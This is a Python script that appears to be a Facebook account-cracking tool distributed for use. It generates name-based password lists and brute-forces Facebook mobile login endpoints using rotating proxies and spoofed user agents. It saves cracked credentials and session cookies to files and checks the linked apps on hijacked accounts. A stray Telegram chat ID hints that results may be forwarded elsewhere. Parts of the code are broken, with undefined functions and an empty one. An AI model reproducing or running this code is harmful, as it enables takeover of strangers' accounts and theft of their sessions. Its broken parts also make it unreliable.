#-----------------[ MR-TAREK ]-------------------#
 
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
print("\033[1;37m [\u001b[36m•\033[1;37m] CHECKING FOR UPDATES \033[1;37m")
time.sleep(2)
 

#------------------[ MR-NOBITA ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
    prox=open('.prox.txt','r').read().splitlines()
#------------------[ USER-AGENT ]-------------------#
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
for xx in range(1000):    
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
cooki = []
cpxx = []
#------------[ HEART- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
chat_id = "5850908645"
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def saurav_dai(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
#------------------[ MAIN ]-----------------#
print("\033[1;37m [\x1b[1;91m•\033[1;37m] WELCOME NOBITA WORLD 💚🥀\033[1;37m")
#------------------[ MACHINE-SUPPORT ]---------------#

def restart():
	os.system(f'python {__file__}')
	os.system('exit')
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
def linex():
	print("""\x1b[37m━━━━━━━━━━━━━━━━━━━━━━━━""")
def cls():
	os.system('clear')
	banner()
	info()
response = requests.get("https://api.ipify.org?format=json")
ipadd = response.json()["ip"]    
logo ="""
\x1b[38;5;82m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[38;5;82m┃    _   ______  ____  _____________    ┃NAME=SAMARPAN JABEU       ┃
\x1b[38;5;82m┃   / | / / __ \/ __ )/  _/_  __/   |   ┃FACEBOOK=SAMARPANJABEGU   ┃
\x1b[38;5;82m┃  /  |/ / / / / __  |/ /  / / / /| |   ┃VERSION=1.3               ┃
\x1b[38;5;82m┃ / /|  / /_/ / /_/ // /  / / / ___ |   ┃WHATSAPP=+9779816029717   ┃
\x1b[38;5;82m┃/_/ |_/\____/_____/___/ /_/ /_/  |_|   ┃GITHUB=MR×SPJL            ┃
\x1b[38;5;82m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝"""

#------------------[ PROXY ]-------------------#

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	pass
prox=open('.prox.txt','r').read().splitlines()

#---------------MENU ]----------------#

def menu():
    os.system('clear')
    print(logo)
    print("\033[1;37m[\u001b[36m•\033[1;37m] TODAY'S DATE :\033[1;93m "+date)
    linex()
    print(f"""[\u001b[36m1\033[1;37m] FILE CLONE""")
    print(f"""[\u001b[36m2\033[1;37m] RANDOM CLONE""")
    print(f"""[\u001b[36m3\033[1;37m] OWNER""")
    print("""[\u001b[36m0\033[1;37m] EXIT""")
    linex()
    NOBITA = input('\033[1;37m[\u001b[36m•\033[1;37m] CHOOSE: ')
    if NOBITA in ['3']:
        os.system('xdg-open https://www.facebook.com/samarpan.limbu.98');menu()
    elif NOBITA in ['1']:
        crack_file()
    elif NOBITA in ['2','02']:
        exit(' Comming Soon 💚 ')
        menu()
    else:
        linex()
        animation(' [×] SELECT CORRECTLY ')
        back()
        
 #__________________RANDOM DEF____________#
#def XXX():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONE')
    print(f'{G1}[{A}2{G1}]{G1} INDIA CLONE')
    print(f'{G1}[{A}0{G1}]{G1} EXIT');linex()
    nobita = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
    if nobita in ['1']:
        bd()
    elif nobita in ['2']:
        India()
    elif nobita in ['3']:
    	nepal()
    elif nobita in ['0']:
    	menu()
    else:
        XXX()       
#__________________ BANGLADESH DEF____________#
def bd():
    clear()
    print(f'≈EXAMPLE ➢ 017 / 019 / 018 / 016');linex()
    code = input(f'[?] CHOICE  ➢ ')
    clear()
    print(f'[≈] EXAMPLE ➢ 3000 / 5000 / 10000 / 99999');linex()
    limit = int(input(f'[?] CHOICE ➢ '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f'[≈] SIM CODE  ➢ {code}')
        print(f'[≈] TOTAL UID ➢ {str(len(user))}')
        print(f"[=] TURN [ON/OFF] AIRPLANE MODE EVERY 3 MIN");linex()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            xb = love[2:]
            psd = [ids,love,ax,bx,cx,xa,xb,'77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']
            sexy.submit(rcrack1,uid,pwx,tl)
    print('')    	
    print(f'\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'[≈] THE PROCESS HAS BEEN COMPLETED')
    print(f'[≈] TOTAL OK ID ➢ {str(len(ok))}')
    print(f'[≈] TOTAL CP ID ➢ {str(len(cp))}')
    print(f'\r━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'[≈] PRESS ENTER TO BACK ')
    menu()
	
#__________________ INDIA DEF____________#
def India():
	clear()

 
#__________________ NEPAL DEF____________#
def nepal():


  
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    linex()
    o = input('[\u001b[36m•\033[1;37m] FILE NAME : ')
    try:lin = open(o).read().splitlines()
    except:
        linex()
        animation('[×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    linex()
    print("[\u001b[36m1\033[1;37m] ONLY OLD IDZ")
    print("[\u001b[36m2\033[1;37m] ONLY NEW IDZ")
    print("[\u001b[36m3\033[1;37m] BOTH MIX IDZ")
    linex()
    hu = input('[\u001b[36m•\033[1;37m] CHOOSE : ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    linex()
    print("[\u001b[36m•\033[1;37m] CHOSE METHOD ")
    linex()
    print("[\u001b[36m1\033[1;37m] METHOD 1")
    print("[\u001b[36m2\033[1;37m] METHOD 2")
    linex()
    hc = input('[\u001b[36m•\033[1;37m] CHOOSE : ')
    linex()                              
    if hc in ['1','01']:
        method.append('mobile')    
    else:
        method.append('mobile')
    print("[\u001b[36m•\033[1;37m] CHECKPOINT ID OPTIONS ")
    linex()
    print("[\u001b[36m1\033[1;37m] SHOW CP ACCOUNTS")
    print("[\u001b[36m2\033[1;37m] DON'T SHOW CP ACCOUNTS")
    linex()
    saurab = input('[\u001b[36m•\033[1;37m] CHOOSE : ')
    if saurab in ['y','Y','111','01','11','1']:
       cpxx.append('y')
    else:
       cpxx.append('n')  
    linex()
    print("[\u001b[36m•\033[1;37m] COOKIE OPTIONS")
    linex()
    print("[\u001b[36m1\033[1;37m] SHOW COOKIES")
    print("[\u001b[36m2\033[1;37m] DON'T SHOW COOKIES")
    linex()
    NOBITA = input('[\u001b[36m•\033[1;37m] CHOOSE : ')
    linex()                              
    if NOBITA in ['1','01']:
        cooki.append('y')   
    else:
        cooki.append('n')   
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print("\033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
    print(f'[\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m',str(len(id)))
    linex()
    print(f'\u001b[36m[✓]\033[1;37m️USE FLIGHT MODE AFTER 3 MINUTES ')
    linex()
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:                
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(nmf)
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'12345@') 
                    pwv.append(frs+'321')
                    pwv.append(frs+'123@')
                    pwv.append(frs+'098')
                    pwv.append(frs+'54321')
                    pwv.append(nmf+'123')
                    pwv.append(nmf+'@123')         
                    pwv.append(frs+'123456789')
                    pwv.append(frs+'12477474@')
                    pwv.append(frs+'@@@@@')
                    pwv.append(frs+'@@@###')
                    pwv.append(frs+'#######')
                    pwv.append(frs+'123@@##')
                    pwv.append(frs+'321@@##')
                    pwv.append(frs+'last')
                    pwv.append(frs+'last123')
                    pwv.append(frs+'@last')
                    pwv.append(frs+'last@123')
                    pwv.append(frs+'last12345')
                    pwv.append(frs+'last@12345')
                                                
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(nmf)
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'12345@') 
                    pwv.append(frs+'321')
                    pwv.append(frs+'123@')
                    pwv.append(frs+'098')
                    pwv.append(frs+'54321')
                    pwv.append(nmf+'123')
                    pwv.append(nmf+'@123')         
                    pwv.append(frs+'123456789')
                    pwv.append(frs+'12477474@')
                    pwv.append(frs+'@@@@@')
                    pwv.append(frs+'@@@###')
                    pwv.append(frs+'#######')
                    pwv.append(frs+'123@@##')
                    pwv.append(frs+'321@@##')
                    pwv.append(frs+'last')
                    pwv.append(frs+'last123')
                    pwv.append(frs+'@last')
                    pwv.append(frs+'last@123')
                    pwv.append(frs+'last12345')
                    pwv.append(frs+'last@12345')
                                        
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    linex()
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
    linex()
    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
    os.system("python NOBITA.py")
    exit() 


 #--------------------[ M1 ]-----------------#
 
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r\u001b[37m[NOBITA-XD-143] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=266003681172790&kid_directed_site=0&app_id=266003681172790&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702051010&hrc=1&wtsid=rdr_03CkC8hTBPuvnU7RM&_rdr')
			data = {'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '1.8000000715255737',
    'referer': 'https://m.facebook.com/bookmarks/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua2,
    'viewport-width': '980',
}		
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=266003681172790&auth_token=163217a672b552df614d575382df8cc6&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&refsrc=deprecated&app_id=266003681172790&cancel=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [\033[1;37mNOBITA-XD-143-OK\033[1;32m\033[1;37m] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				open('/sdcard/NOBITA-XD-143-OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
				jones(idf,pw,kuki)
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K}\033[1;36mNOBITA-XD-143-CP \033[1;37m{P}] {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				open('/sdcard/NOBITA-XD-143-CP.txt', 'a').write( idf+' | '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	   
	#------------------[ M2 ]-------------------#

def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\u001b[37m[NOBITA-XD-143] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":"m.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":"www.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("NOBITA-XD-143")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("NOBITA-XD-143")}-OK] {idf} │ {pw} {P}')
				cek_apk(kuki)
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				jones(idf,pw,kuki)
				ok.append(wrt)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	
#--------------------[ RANDOM ]-----------------#
 
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
            sys.stdout.write(f'\r \033[1;90m[\33[1;92mNOBITA-XD-143\033[1;90m]\x1b[1;96m-\033[1;90m[{cl}{loop}\033[1;90m]\x1b[1;96m-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'referer': 'https://p.facebook.com/?stype=lo&deoia=1&jlou=AfdiCMGmQA0YleCSODPfGHbndb4M90_eRB5wzFqYOhA_M0Niu8fMpAXaf6I0XMe1GlBltZpz-DTVfZ_BKuTqCwa5gjyyiPFqJWK5Z4GUwxBzYw&smuh=26960&lh=Ac9_jF2G7Lvl2qNVHZI&wtsid=rdr_0qAjVY9bL6QaeghBM&_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Infinix X6515"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=111&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[NOBITA-XD-143-RNDM-OK💚] {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
                open('/sdcard/NOBITA-XD-143-RNDM-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[NOBITA-XD-143-RNDM-CP] {uid}|{ps}")
                open('/sdcard/NOBITA-XD-143-RNDM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass	
#----------------[ ID-CHECKER ]--------------------------#

def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	menu()

